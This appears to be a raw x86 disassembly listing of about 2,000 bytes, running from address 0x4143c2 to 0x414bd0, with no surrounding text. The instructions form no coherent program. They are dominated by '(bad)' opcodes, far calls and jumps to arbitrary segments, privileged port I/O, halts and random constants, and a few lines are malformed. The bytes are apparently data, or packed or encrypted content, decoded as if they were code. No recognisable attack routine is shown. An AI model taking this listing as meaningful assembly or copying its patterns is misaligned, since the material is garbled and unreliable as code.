  4143c2:	sbb    ax,0xc3db
  4143c6:	jg     0x41435f
  4143c8:	jno    0x4143ff
  4143ca:	call   0x5a23:0x9c7ec05
  4143d1:	std    
  4143d2:	dec    esp
  4143d3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4143d4:	mov    edx,0xed1006ea
  4143d9:	out    dx,eax
  4143da:	jp     0x4143cf
  4143dc:	mov    dl,0xc4
  4143de:	xchg   esi,eax
  4143df:	inc    edx
  4143e0:	popf   
  4143e1:	out    0xdc,al
  4143e3:	arpl   WORD PTR [eax],dx
  4143e5:	or     edx,DWORD PTR [ecx]
  4143e7:	pushf  
  4143e8:	in     eax,0x82
  4143ea:	in     al,0x1e
  4143ec:	out    dx,al
  4143ed:	mov    dh,0x99
  4143ef:	mov    ds:0x4ac18a4d,eax
  4143f4:	pop    ss
  4143f5:	mov    ebx,DWORD PTR [ebp+edi*1-0x4a54e26b]
  4143fc:	lea    ecx,[esi]
  4143fe:	cmp    eax,0x43cb5568
  414403:	das    
  414404:	std    
  414405:	pop    edx
  414406:	add    dl,ah
  414408:	mov    al,0x77
  41440a:	mov    ecx,?
  41440c:	inc    eax
  41440d:	aam    0x35
  41440f:	inc    esi
  414410:	outs   dx,DWORD PTR ds:[esi]
  414411:	jmp    0xfd22:0xb84fc5a
  414418:	and    eax,0x82371a09
  41441d:	arpl   WORD PTR [edx-0x354b4eec],bx
  414423:	mov    bx,0xbd59
  414427:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414428:	pop    ebx
  414429:	out    0x38,eax
  41442b:	gs inc ebp
  41442d:	and    eax,0x24b53175
  414432:	pop    ds
  414433:	(bad)  
  414434:	or     BYTE PTR [edx+0x7865e9aa],bh
  41443a:	bound  ebx,QWORD PTR [ebp+0x761a5185]
  414440:	cs enter 0x6b45,0x4e
  414445:	mov    ecx,0x5f61f087
  41444a:	mov    eax,ds:0xfc0b247b
  41444f:	cs add eax,0x3c90f40e
  414455:	or     al,0x3e
  414457:	mov    esp,0x624e5f5
  41445c:	mov    DWORD PTR [esp+ebx*4-0x79],edx
  414460:	mov    ?,WORD PTR [ebp-0x66]
  414463:	jne    0x4144be
  414465:	jg     0x414422
  414467:	ror    ecx,0xdd
  41446a:	mov    ds:0x430b251f,eax
  41446f:	stc    
  414470:	add    BYTE PTR [ecx+0x6c],ah
  414473:	inc    eax
  414474:	push   ecx
  414475:	gs out dx,al
  414477:	aad    0xb2
  414479:	mov    DWORD PTR [edx+eax*8-0x1fad67e5],eax
  414480:	hlt    
  414481:	or     esi,DWORD PTR [eax+0x2ee43f33]
  414487:	xchg   BYTE PTR [edx],dl
  414489:	cs lahf 
  41448b:	mov    esp,0xe95477a2
  414490:	ss xchg ebp,eax
  414492:	and    eax,0xf693c1a7
  414497:	rcr    DWORD PTR [esi-0x6dfd6545],0xcb
  41449e:	mov    ecx,0xce8fadda
  4144a3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4144a4:	call   0xf5420220
  4144a9:	jno    0x4144f4
  4144ab:	push   ebx
  4144ac:	mov    esp,0x73d84446
  4144b1:	imul   edi,esp,0x6c
  4144b4:	pop    esi
  4144b5:	ffree  st(7)
  4144b7:	aam    0x26
  4144b9:	or     ecx,DWORD PTR [ecx-0x596d5d81]
  4144bf:	push   esp
  4144c0:	cld    
  4144c1:	mov    eax,0x4b48939a
  4144c6:	add    edx,DWORD PTR ss:[eax]
  4144c9:	adc    al,0xd3
  4144cb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4144cc:	pop    ss
  4144cd:	adc    DWORD PTR [esi],edx
  4144cf:	cli    
  4144d0:	cmp    ecx,DWORD PTR [esi]
  4144d2:	mov    WORD PTR [edx+0x7f8ad9f6],si
  4144d9:	cli    
  4144da:	cdq    
  4144db:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4144dc:	shl    DWORD PTR [eax+0x31777406],0x7d
  4144e3:	btr    esp,esi
  4144e6:	clc    
  4144e7:	push   es
  4144e8:	push   edx
  4144e9:	mov    dh,0x39
  4144eb:	stc    
  4144ec:	add    bh,0x61
  4144ef:	inc    edi
  4144f0:	arpl   WORD PTR [ebx],si
  4144f2:	jne    0x414486
  4144f4:	xor    eax,0x3eefca4d
  4144f9:	sti    
  4144fa:	in     al,dx
  4144fb:	sahf   
  4144fc:	xchg   edx,eax
  4144fd:	int    0x9a
  4144ff:	xchg   ebp,eax
  414500:	sbb    edx,DWORD PTR [edi+0x24d48093]
  414506:	(bad)  
  414508:	jnp    0x4144b9
  41450a:	xlat   BYTE PTR ds:[ebx]
  41450b:	sbb    al,0xfa
  41450d:	aam    0x13
  41450f:	out    dx,al
  414510:	mov    ch,0xe2
  414512:	mov    al,ds:0xfd860ec4
  414517:	ss inc edx
  414519:	xchg   edi,eax
  41451a:	(bad)  
  41451b:	stc    
  41451c:	sub    eax,0x673fe615
  414521:	or     BYTE PTR [edx+edi*1],dl
  414524:	push   esi
  414525:	jb     0x414549
  414527:	fadd   st(6),st
  414529:	xor    ebx,DWORD PTR [edx-0x29ecf4aa]
  41452f:	in     eax,dx
  414530:	mov    eax,ds:0x94a7fc50
  414535:	jne    0x41453b
  414537:	(bad)  
  414538:	pusha  
  414539:	cmpxchg DWORD PTR [ebx-0x4e],esp
  41453d:	sbb    bh,al
  41453f:	data16 cs in al,0x83
  414543:	mov    ch,0x93
  414545:	xor    eax,0xb214d8cc
  41454a:	push   edx
  41454b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41454c:	inc    esi
  41454d:	dec    ecx
  41454e:	ja     0x414595
  414550:	sbb    al,0x92
  414552:	call   0xffdc:0x9dc527c3
  414559:	sbb    DWORD PTR fs:[ebx+0x641a61d4],0xadf9af93
  414564:	add    BYTE PTR [edx-0x1a],0x15
  414568:	mov    bl,0xa2
  41456a:	(bad)  
  41456b:	cmp    eax,ebp
  41456d:	pushf  
  41456e:	and    eax,0x9aa6f688
  414573:	pop    ebp
  414574:	jmp    0xa20b:0x6786dee0
  41457b:	pop    eax
  41457c:	test   DWORD PTR [ebx],eax
  41457e:	rol    DWORD PTR [esi],1
  414580:	sub    ecx,DWORD PTR [edx-0x6a]
  414583:	lock mov edi,0x3cf308a5
  414589:	sbb    al,0x9f
  41458b:	mov    ds:0xb7100b7d,eax
  414590:	xlat   BYTE PTR ds:[ebx]
  414591:	add    al,0x60
  414593:	(bad)  
  414594:	(bad)  
  414595:	jmp    DWORD PTR [edi+0x27]
  414598:	fidiv  DWORD PTR ds:0x9bdc051e
  41459e:	dec    edi
  41459f:	call   0xda76:0xb4992416
  4145a6:	shl    BYTE PTR [edx-0x41dfe59e],1
  4145ac:	mov    dl,0x68
  4145ae:	add    DWORD PTR [eax+0x5d],ebp
  4145b1:	mov    ch,cl
  4145b3:	push   0x26
  4145b5:	or     ebx,DWORD PTR [edi+edi*2+0x7b]
  4145b9:	aad    0x25
  4145bb:	ja     0x4145c4
  4145bd:	test   eax,0xd86d079d
  4145c2:	or     al,0x22
  4145c4:	and    dh,BYTE PTR [esi-0x1827908f]
  4145ca:	cmps   DWORD PTR gs:[esi],DWORD PTR es:[edi]
  4145cc:	in     eax,dx
  4145cd:	clc    
  4145ce:	jne    0x41455e
  4145d0:	or     esi,DWORD PTR [edx+0x56]
  4145d3:	das    
  4145d4:	ret    0x22d5
  4145d7:	jmp    0x41458b
  4145d9:	pop    ds
  4145da:	aaa    
  4145db:	lock add BYTE PTR ds:[esi+0x3a0b2bc2],al
  4145e3:	jecxz  0x414587
  4145e5:	(bad)  
  4145e6:	(bad)  
  4145e7:	mov    eax,ds:0x5ceef59d
  4145ec:	mov    dl,0x54
  4145ee:	jb     0x4145c9
  4145f0:	xor    BYTE PTR [ebp-0x6b],bh
  4145f3:	das    
  4145f4:	inc    edi
  4145f5:	or     edx,DWORD PTR [edx+0x7]
  4145f8:	xor    eax,0x4592d6f7
  4145fd:	jmp    0x396fb79c
  414602:	test   DWORD PTR [ebp+edi*2+0x5b],ecx
  414606:	pop    edx
  414607:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414608:	out    dx,eax
  414609:	cs jg  0x414670
  41460c:	sbb    BYTE PTR [ecx],dh
  41460e:	cs aaa 
  414610:	mov    dl,0x9d
  414612:	lahf   
  414613:	xor    al,ch
  414615:	adc    al,0x93
  414617:	jno    0x4145b8
  414619:	or     ebp,DWORD PTR [edi]
  41461b:	sbb    eax,0xce4419e3
  414620:	rcr    DWORD PTR [ebx-0x2276774c],1
  414626:	call   0x3772:0x6e539360
  41462d:	or     eax,DWORD PTR [ecx]
  41462f:	jge    0x4146ae
  414631:	sbb    esi,DWORD PTR [esp+ecx*4]
  414634:	ret    
  414635:	fnsave [esi-0x656aaf9c]
  41463b:	inc    eax
  41463c:	neg    DWORD PTR [edi+0x48]
  41463f:	ror    BYTE PTR [ebp+0xb],cl
  414642:	jl     0x414690
  414644:	or     eax,0x289c1be3
  414649:	mov    esp,0xf0546ce7
  41464e:	call   0x9c3e:0x46a13795
  414655:	lods   eax,DWORD PTR ds:[esi]
  414656:	mov    esp,DWORD PTR [edi+0x6b997320]
  41465c:	and    al,0x3e
  41465e:	mov    al,ds:0x856eb967
  414663:	fcmovnbe st,st(2)
  414665:	xor    BYTE PTR ds:0x1a4e9924,0x37
  41466c:	scas   eax,DWORD PTR es:[edi]
  41466d:	lock movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41466f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414670:	inc    edx
  414671:	aas    
  414672:	and    eax,0xb57c108b
  414677:	int3   
  414678:	mov    bl,0x9f
  41467a:	or     bh,BYTE PTR [ecx+0x70]
  41467d:	stos   BYTE PTR es:[edi],al
  41467e:	loopne 0x414695
  414680:	jle    0x414675
  414682:	fisub  DWORD PTR [edi+0x56b08984]
  414688:	mov    ss,WORD PTR [ebp+0x73]
  41468b:	or     bl,0x90
  41468e:	call   0xb011:0x735eb20
  414695:	mov    esi,0x102ca79d
  41469a:	jmp    0x41468e
  41469c:	push   edi
  41469d:	jle    0x414623
  41469f:	mov    ch,0xb2
  4146a1:	test   eax,0xd263275a
  4146a6:	push   ebp
  4146a7:	jno    0x41467c
  4146a9:	add    al,0xd7
  4146ab:	adc    ah,BYTE PTR [ecx-0x55]
  4146ae:	sbb    dh,BYTE PTR [esp+edx*1-0x489f13ff]
  4146b5:	(bad)  
  4146b6:	popf   
  4146b7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4146b8:	sbb    eax,0x1285a4e
  4146bd:	push   ebp
  4146be:	sub    eax,0xdc06f1a7
  4146c3:	retw   0x2398
  4146c7:	shl    DWORD PTR [esi-0x187f5ea9],cl
  4146cd:	bound  ebx,QWORD PTR [edx+0x4e]
  4146d0:	nop
  4146d1:	sbb    bl,bh
  4146d3:	inc    ebx
  4146d4:	in     eax,0xb
  4146d6:	out    0x9a,eax
  4146d8:	cli    
  4146d9:	ds pop esp
  4146db:	and    esp,eax
  4146dd:	into   
  4146de:	call   0x5703:0xce678594
  4146e5:	sbb    al,0xb2
  4146e7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4146e8:	inc    edx
  4146e9:	rol    DWORD PTR [eax+0x420c15d1],1
  4146ef:	(bad)  
  4146f0:	out    0x48,eax
  4146f2:	call   0x62eb:0x130fe264
  4146f9:	in     al,dx
  4146fa:	mov    ss,WORD PTR [edi]
  4146fc:	int3   
  4146fd:	or     eax,DWORD PTR [ebx]
  4146ff:	pushf  
  414700:	loope  0x414753
  414702:	xor    DWORD PTR [esi*1+0x59bb9ab2],0xffffffdc
  41470a:	push   es
  41470b:	test   BYTE PTR [ebx+0x5db1cc08],0x30
  414712:	jl     0x4146bb
  414714:	aad    0x74
  414716:	pusha  
  414717:	dec    esi
  414718:	inc    ecx
  414719:	scas   eax,DWORD PTR es:[edi]
  41471a:	call   0x1cff:0xd924cbe5
  414721:	sar    ebx,0xa7
  414724:	hlt    
  414725:	push   cs
  414726:	retf   
  414727:	in     al,dx
  414728:	or     al,0x9e
  41472a:	dec    ecx
  41472b:	cmp    eax,0xf31704b2
  414730:	fisub  DWORD PTR [edi+0x3d]
  414733:	mov    BYTE PTR [eax-0x280e951e],bh
  414739:	inc    edi
  41473a:	cli    
  41473b:	adc    BYTE PTR [edx-0x3f755442],dh
  414741:	int    0x60
  414743:	sbb    BYTE PTR [edx+0x44cba7fe],dh
  414749:	repnz dec eax
  41474b:	ror    DWORD PTR gs:[ebx],1
  41474e:	cmc    
  41474f:	push   esi
  414750:	pushf  
  414751:	xor    BYTE PTR [ecx-0x6af00b6a],0xc3
  414758:	lods   eax,DWORD PTR ds:[esi]
  414759:	cmp    BYTE PTR [eax-0x79],al
  41475c:	test   al,0x9d
  41475e:	xor    edx,DWORD PTR ds:0x8faf3531
  414764:	mov    dl,0x87
  414766:	in     al,0x6
  414768:	aad    0x5
  41476a:	sbb    BYTE PTR [eax-0x609c964e],bl
  414770:	leave  
  414771:	sbb    ebp,DWORD PTR [esi-0x2a]
  414774:	add    al,0x33
  414776:	jno    0x4147d7
  414778:	mov    al,ds:0xba7fb03
  41477d:	test   al,0x64
  41477f:	lds    ebp,FWORD PTR [edx-0x78]
  414782:	call   0xa3db:0x91c66dd8
  414789:	fcmove st,st(7)
  41478b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41478c:	jne    0x41479d
  41478e:	data16 rcl BYTE PTR [esi-0x1c],cl
  414792:	sbb    eax,0x9a75c27e
  414797:	mov    edi,0xebb8a2d
  41479c:	push   es
  41479d:	push   ecx
  41479e:	push   0xfcadc1a6
  4147a3:	pavgw  mm5,QWORD PTR [edx+edi*4]
  4147a7:	jnp    0x4147ee
  4147a9:	sbb    eax,0x2846eb9a
  4147ae:	bound  edi,QWORD PTR [edi+0x43]
  4147b1:	fstp   st(7)
  4147b3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4147b4:	scas   al,BYTE PTR es:[edi]
  4147b5:	inc    eax
  4147b6:	sub    eax,0xc41255d8
  4147bb:	xor    esi,DWORD PTR [edx+0x4b69e1da]
  4147c1:	mov    ebp,cs
  4147c3:	nop
  4147c4:	jo     0x4147a7
  4147c6:	add    ebp,edi
  4147c8:	jns    0x4147ad
  4147ca:	popa   
  4147cb:	mov    eax,0x92da5a66
  4147d0:	mov    esi,0xaa5846e
  4147d5:	add    eax,0x5284c5a9
  4147da:	cmp    ch,BYTE PTR [edx]
  4147dc:	ss int3 
  4147de:	enter  0xb28f,0xe4
  4147e2:	das    
  4147e3:	arpl   WORD PTR [ecx],ax
  4147e5:	test   BYTE PTR [ebx],bl
  4147e7:	add    dl,bl
  4147e9:	or     ecx,DWORD PTR [eax+0x5f7e1c7a]
  4147ef:	idiv   DWORD PTR [edx]
  4147f1:	cmp    bl,BYTE PTR [edx+0x2d4f99a1]
  4147f7:	dec    ebx
  4147f8:	lods   eax,DWORD PTR ds:[esi]
  4147f9:	mov    eax,ds:0x45b6a775
  4147fe:	push   esp
  4147ff:	cmp    esi,DWORD PTR [edi+0x57]
  414802:	sbb    DWORD PTR [eax],ebx
  414804:	enter  0xb264,0xb2
  414808:	(bad)
  41480b:	jnp    0x414821
  41480d:	addr16 call 0x8d62:0x8229c24e
  414815:	je     0x414858
  414817:	mov    DWORD PTR [ecx-0x465b2ac4],ecx
  41481d:	dec    esp
  41481e:	repnz out dx,eax
  414820:	xor    ecx,ebx
  414822:	inc    edx
  414823:	jmp    0x414855
  414825:	pop    ecx
  414826:	call   0x33e1:0x9411413c
  41482d:	leave  
  41482e:	or     al,0xa7
  414830:	pop    eax
  414831:	sub    esi,DWORD PTR [eax-0x34fd9dab]
  414837:	cmp    DWORD PTR [edx-0x49c22d94],esi
  41483d:	sbb    al,0xec
  41483f:	add    BYTE PTR [edi-0x4c34fcf4],0xbe
  414846:	xchg   esp,eax
  414847:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414848:	out    0x5d,al
  41484a:	adc    ecx,eax
  41484c:	mov    ch,0xd3
  41484e:	pop    eax
  41484f:	sbb    DWORD PTR [esi+0x328c8f71],edi
  414855:	arpl   WORD PTR [edi+0x4],sp
  414858:	cmc    
  414859:	or     eax,DWORD PTR [edi-0x37]
  41485c:	add    DWORD PTR [edx-0x7998e2a2],ebx
  414862:	call   0x4c4e:0x745cc128
  414869:	sbb    dh,ch
  41486b:	xor    DWORD PTR [esi+eiz*2+0x84da70f],0x7d
  414873:	lods   eax,DWORD PTR ds:[esi]
  414874:	jmp    0x41488a
  414876:	call   0x6932:0x817286f7
  41487d:	mov    ecx,0x1c9aa725
  414882:	or     DWORD PTR [edi+0x55aaf2da],ebp
  414888:	mov    dl,0xf8
  41488a:	mov    WORD PTR [eax+0x3c],es
  41488d:	mov    bl,0xd8
  41488f:	dec    esi
  414890:	add    BYTE PTR [ebx],cl
  414892:	mov    eax,0x5e36384a
  414897:	sti    
  414898:	jp     0x4148e9
  41489a:	call   0xb622:0x1d919e2c
  4148a1:	or     eax,0x8550a729
  4148a6:	adc    al,BYTE PTR [eax]
  4148a8:	cld    
  4148a9:	push   ds
  4148aa:	pop    eax
  4148ab:	dec    ebp
  4148ac:	scas   al,BYTE PTR es:[edi]
  4148ad:	std    
  4148ae:	pop    esi
  4148af:	push   DWORD PTR [edx]
  4148b1:	sub    dh,al
  4148b3:	(bad)  
  4148b4:	rcr    BYTE PTR [eax-0x2b6164b2],cl
  4148ba:	jecxz  0x414863
  4148bc:	push   ebp
  4148bd:	outs   dx,BYTE PTR ds:[esi]
  4148be:	std    
  4148bf:	adc    eax,0x42ad4568
  4148c4:	mov    dl,0xcf
  4148c6:	push   ecx
  4148c7:	std    
  4148c8:	push   ebx
  4148c9:	fimul  WORD PTR [ecx]
  4148cb:	sub    dl,BYTE PTR [ebx+ecx*1-0x1456bea]
  4148d2:	xchg   ebx,eax
  4148d3:	jl     0x4148c3
  4148d5:	xlat   BYTE PTR ds:[ebx]
  4148d6:	call   0x7fb1:0xa2f0b976
  4148dd:	inc    ecx
  4148de:	mov    al,0x98
  4148e0:	mov    bh,0x7d
  4148e2:	push   edx
  4148e3:	dec    ebp
  4148e4:	mov    ah,0xbd
  4148e6:	stos   DWORD PTR es:[edi],eax
  4148e7:	jecxz  0x414953
  4148e9:	mov    eax,ds:0x923b8095
  4148ee:	cdq    
  4148ef:	xchg   DWORD PTR [eax+0x3],ebp
  4148f2:	(bad)
  4148f5:	push   ss
  4148f6:	(bad)  
  4148f8:	in     al,dx
  4148f9:	or     esi,esi
  4148fb:	rcl    BYTE PTR ds:0xb22cf127,0xaa
  414902:	retf   0xb902
  414905:	fmulp  st(5),st
  414907:	(bad)  
  414908:	pop    esp
  414909:	push   ss
  41490a:	mov    BYTE PTR [ebx-0x392ef445],bh
  414910:	mov    esi,0xb2702de6
  414915:	outs   dx,BYTE PTR ds:[esi]
  414916:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414917:	out    dx,al
  414918:	xchg   ebx,eax
  414919:	xchg   esi,eax
  41491a:	stos   BYTE PTR es:[edi],al
  41491b:	jmp    0x414954
  41491d:	or     esi,ebp
  41491f:	push   ss
  414920:	jnp    0x414922
  414922:	dec    ebx
  414923:	(bad)  
  414924:	(bad)  
  414926:	call   0x6231:0xa976bd65
  41492d:	arpl   cx,dx
  41492f:	test   eax,0xc9ddf295
  414934:	mov    dl,0x83
  414936:	stos   BYTE PTR es:[edi],al
  414937:	(bad)  
  414938:	push   ecx
  414939:	sbb    DWORD PTR [edx+0x14c8c8a4],ebx
  41493f:	mov    dl,0x45
  414941:	jecxz  0x4149ab
  414943:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414944:	pushf  
  414945:	adc    esp,DWORD PTR [esi+ebp*2]
  414948:	fwait
  414949:	push   esi
  41494a:	mov    cl,0x8
  41494c:	mov    ch,0x4a
  41494e:	sbb    ecx,DWORD PTR [esi+0x35]
  414951:	icebp  
  414952:	retf   0x77dd
  414955:	xchg   DWORD PTR [edi+eiz*4-0x43],edi
  414959:	aam    0x61
  41495b:	jno    0x41494f
  41495d:	pop    edx
  41495e:	or     ah,BYTE PTR [ebx-0x4f]
  414961:	fistp  WORD PTR [ebx+0x5f16e14]
  414967:	adc    BYTE PTR [edx+0x5b],dl
  41496a:	dec    ecx
  41496b:	jbe    0x41492a
  41496d:	or     al,0xba
  41496f:	(bad)  
  414970:	cs pusha 
  414972:	jo     0x41497b
  414974:	sub    al,0x1a
  414976:	push   eax
  414977:	into   
  414978:	lea    ebx,[ecx+0x365f276f]
  41497e:	out    0x18,eax
  414980:	push   es
  414981:	in     al,0xe3
  414983:	pop    ebx
  414984:	xor    BYTE PTR [edi],dl
  414986:	leave  
  414987:	stos   DWORD PTR es:[edi],eax
  414988:	cmc    
  414989:	retf   
  41498a:	mov    edx,0x59d0503c
  41498f:	ins    DWORD PTR es:[edi],dx
  414990:	scas   eax,DWORD PTR es:[edi]
  414991:	(bad)  
  414992:	lock inc edx
  414994:	jb     0x41492e
  414996:	mov    eax,0x5a80939e
  41499b:	popf   
  41499c:	add    DWORD PTR [edx],ecx
  41499e:	sbb    edi,ebp
  4149a0:	jecxz  0x41492b
  4149a2:	stos   BYTE PTR es:[edi],al
  4149a3:	and    DWORD PTR ds:0xe68b514b,esi
  4149a9:	dec    ebx
  4149aa:	call   0x94514c93
  4149af:	xchg   edx,eax
  4149b0:	cmp    al,0xc4
  4149b2:	hlt    
  4149b3:	out    0x5a,eax
  4149b5:	cmp    bh,ah
  4149b7:	stos   BYTE PTR es:[edi],al
  4149b8:	in     eax,0xb
  4149ba:	pop    esi
  4149bb:	inc    edi
  4149bc:	(bad)  
  4149bd:	popf   
  4149be:	jecxz  0x4149e5
  4149c0:	xchg   ebp,eax
  4149c1:	into   
  4149c2:	test   DWORD PTR [esi-0x37],edi
  4149c5:	ins    DWORD PTR es:[edi],dx
  4149c6:	popf   
  4149c7:	jne    0x414997
  4149c9:	sar    bl,1
  4149cb:	mov    DWORD PTR [edi+eiz*4+0x6a],esi
  4149cf:	and    esi,ebx
  4149d1:	or     esi,DWORD PTR [ebp+0x6761a18b]
  4149d7:	inc    ecx
  4149d8:	sub    al,BYTE PTR [edx+ebx*4]
  4149db:	xlat   BYTE PTR ds:[ebx]
  4149dc:	pop    esi
  4149dd:	loope  0x414998
  4149df:	retf   0x52a0
  4149e2:	inc    ecx
  4149e3:	pop    ecx
  4149e4:	push   edx
  4149e5:	or     ebp,DWORD PTR [edx]
  4149e7:	sbb    eax,0x6c552a5d
  4149ec:	mov    dh,0xf4
  4149ee:	call   0x142c:0x25d46279
  4149f5:	cmp    eax,0xa395a75d
  4149fa:	mov    esp,0x7c772239
  4149ff:	fnstenv [edx+0x24d5fc1a]
  414a05:	es jb  0x414a71
  414a08:	repz xor edx,esp
  414a0b:	aam    0xb2
  414a0d:	call   0xaefa:0x589a7209
  414a14:	ret    0x994b
  414a17:	addr16 fmul st,st(5)
  414a1a:	in     eax,0xb0
  414a1c:	adc    edx,ebx
  414a1e:	std    
  414a1f:	add    eax,0xc8a00803
  414a24:	or     al,BYTE PTR [edx+0x3b72d49c]
  414a2a:	into   
  414a2b:	xchg   edx,eax
  414a2c:	mov    esp,0xfb1ac718
  414a31:	jmp    0x414a1f
  414a33:	sub    BYTE PTR [edx+0x23],dh
  414a36:	xchg   BYTE PTR [edx-0x7ac3c0c1],ah
  414a3c:	mov    al,0x8c
  414a3e:	sub    BYTE PTR [edi-0xfa41088],ah
  414a44:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414a45:	fstp   QWORD PTR [ebx]
  414a47:	daa    
  414a48:	mov    dl,0x4
  414a4a:	aad    0xbc
  414a4c:	out    0xfc,al
  414a4e:	inc    ebx
  414a4f:	mov    ecx,0x69bf604a
  414a54:	xchg   DWORD PTR [ecx-0x2b],edi
  414a57:	adc    dl,BYTE PTR [edx+0x78]
  414a5a:	push   cs
  414a5b:	jmp    0x414a87
  414a5d:	push   ds
  414a5e:	call   0x2484:0xd4861959
  414a65:	and    DWORD PTR [edi-0x59],esp
  414a68:	or     dh,bh
  414a6a:	jl     0x414ab4
  414a6c:	xchg   BYTE PTR [ebx],al
  414a6e:	mov    ds,WORD PTR [edx+esi*4+0x24]
  414a72:	jmp    0x1ffe6d51
  414a77:	lods   eax,DWORD PTR ds:[esi]
  414a78:	imul   ebx,DWORD PTR ds:0xb2182ce,0x7a
  414a7f:	sbb    DWORD PTR [edi+edi*2-0x46],ebx
  414a83:	add    dh,BYTE PTR [edx-0x2f976c78]
  414a89:	add    al,0xf4
  414a8b:	loope  0x414af9
  414a8d:	or     edi,DWORD PTR [eax]
  414a8f:	clc    
  414a90:	sub    eax,0x22bc1256
  414a95:	mov    esp,0x41b271ee
  414a9a:	test   DWORD PTR [ebx],ebx
  414a9c:	pop    esp
  414a9d:	xchg   BYTE PTR [eax+0x3f],dh
  414aa0:	cld    
  414aa1:	pop    ss
  414aa2:	pop    edx
  414aa3:	xor    esi,DWORD PTR [esi+0x4b]
  414aa6:	mov    al,BYTE PTR [esi+0x10]
  414aa9:	sub    al,0x7e
  414aab:	stc    
  414aac:	mov    dl,0xb8
  414aae:	cmp    DWORD PTR [edi-0x69],0xfffffff1
  414ab2:	sbb    eax,0xad0b4403
  414ab7:	loope  0x414a3c
  414ab9:	dec    eax
  414aba:	cmp    BYTE PTR [ebx+0x29],dh
  414abd:	fwait
  414abe:	call   0x3eff:0x1f4418f7
  414ac5:	xlat   BYTE PTR ds:[ebx]
  414ac6:	and    DWORD PTR [esi-0x49d10fa6],ebp
  414acc:	mov    cl,0x71
  414ace:	scas   al,BYTE PTR es:[edi]
  414acf:	in     eax,0x5a
  414ad1:	jl     0x414b4e
  414ad3:	cs int3 
  414ad5:	push   es
  414ad6:	xchg   esp,eax
  414ad7:	push   0x52
  414ad9:	sub    BYTE PTR [edi],ch
  414adb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414adc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414add:	repz push cs
  414adf:	fidiv  WORD PTR [ebp+0xb]
  414ae2:	add    DWORD PTR ds:0x40abea59,esp
  414ae8:	imul   edx,DWORD PTR [edx-0x20],0x9a6248e0
  414aef:	pushf  
  414af0:	cs js  0x414b24
  414af3:	add    ch,BYTE PTR [ecx-0x50581f5c]
  414af9:	out    0xac,al
  414afb:	adc    al,0xb6
  414afd:	or     DWORD PTR [ebx+0x1ea7b0b7],ebp
  414b03:	fidivr WORD PTR [edx-0x25]
  414b06:	test   BYTE PTR [edi+0x54],al
  414b09:	mov    cl,0x46
  414b0b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414b0c:	adc    eax,0x1997fd21
  414b11:	xor    esi,esp
  414b13:	out    dx,al
  414b14:	mov    dl,0xed
  414b16:	xchg   edi,eax
  414b17:	and    edx,DWORD PTR [ecx-0x4edf1a3b]
  414b1d:	or     esp,DWORD PTR [ecx-0x3b0afece]
  414b23:	test   DWORD PTR [ebp-0x6144656d],ebx
  414b29:	push   es
  414b2a:	adc    cl,ch
  414b2c:	mov    BYTE PTR [eax+0x56f8ac87],al
  414b32:	popf   
  414b33:	and    BYTE PTR [ecx+0xae772e5],dh
  414b39:	inc    esp
  414b3a:	ss int 0xb2
  414b3d:	xor    eax,0xcddaf8ca
  414b42:	push   es
  414b43:	sbb    ecx,0x54a032ef
  414b49:	mov    ebp,0xdabd44fb
  414b4e:	cmp    DWORD PTR [esi+edx*8],0xfffffff2
  414b52:	pop    esp
  414b53:	(bad)  
  414b54:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414b55:	rcr    DWORD PTR [edx-0x262f3ab8],0x67
  414b5c:	and    al,0x29
  414b5e:	test   DWORD PTR [edi-0x4ba0333d],esp
  414b64:	repz inc edx
  414b66:	jnp    0x414bb4
  414b68:	mov    dl,0x51
  414b6a:	adc    eax,0x99ff5abe
  414b6f:	xchg   edi,eax
  414b70:	cmp    DWORD PTR [ecx+esi*8],eax
  414b73:	mov    edi,0xb408cf40
  414b78:	popa   
  414b79:	or     eax,DWORD PTR [edx-0x10]
  414b7c:	loopne 0x414b8e
  414b7e:	cmp    al,0xb0
  414b80:	mov    dl,0xed
  414b82:	stos   DWORD PTR es:[edi],eax
  414b83:	pop    esi
  414b84:	mov    al,0x9a
  414b86:	in     al,0x9d
  414b88:	push   0x5c9b210b
  414b8d:	test   al,0xcd
  414b8f:	jbe    0x414b9b
  414b91:	bound  ebx,QWORD PTR [edx+0x443a0eef]
  414b97:	push   edi
  414b98:	sub    esp,DWORD PTR [ebx+0x7a]
  414b9b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414b9c:	adc    DWORD PTR [ebx],0x7c690cfe
  414ba2:	adc    bh,dl
  414ba4:	mov    dl,0x20
  414ba6:	fdivr  st,st(0)
  414ba8:	xor    ebx,esp
  414baa:	pop    edx
  414bab:	sbb    bl,cl
  414bad:	or     esi,edx
  414baf:	pop    edi
  414bb0:	sahf   
  414bb1:	lods   eax,DWORD PTR ds:[esi]
  414bb2:	jl     0x414bf7
  414bb4:	jge    0x414be5
  414bb6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414bb7:	and    eax,0x629a70a4
  414bbc:	cmp    eax,0xee52e004
  414bc1:	test   DWORD PTR [ebx],esp
  414bc3:	mov    eax,0x7b29931d
  414bc8:	sbb    cl,BYTE PTR [ebx]
  414bca:	jmp    0x414b63
  414bcc:	xchg   esp,eax
  414bcd:	test   al,bl
  414bcf:	dec    ebp
  414bd0:	mov    eax,ds:0xb253bfa1
